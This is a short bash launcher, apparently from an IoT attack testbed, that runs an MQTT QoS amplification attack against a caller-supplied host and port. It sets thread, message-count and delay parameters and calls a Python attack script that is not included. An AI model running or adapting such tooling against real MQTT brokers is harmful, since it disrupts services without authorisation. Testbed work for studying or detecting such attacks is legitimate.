#!/usr/bin/env bash
set -euo pipefail

TARGET="${1:-${TARGET_IP:-}}"
PORT="${2:-${TARGET_PORT:-1883}}"
: "${TARGET:?target IP/FQDN required}"

THREADS="${THREADS:-8}"
COUNT="${COUNT:-20}"
DELAY_MS="${DELAY_MS:-20}"
TOPIC="${TOPIC:-attack/mqtt_qos_amplification}"
CLIENT_PREFIX="${CLIENT_PREFIX:-qos_amplifier}"

export THREADS COUNT DELAY_MS TOPIC CLIENT_PREFIX

echo "[attack] mqtt_qos_amplification target=${TARGET}:${PORT} threads=${THREADS} count=${COUNT} delay_ms=${DELAY_MS} topic=${TOPIC}"
python3 /iotzoo_attack/mqtt-qos-amplification.py "${TARGET}" "${PORT}"
echo "[attack] mqtt_qos_amplification completed"
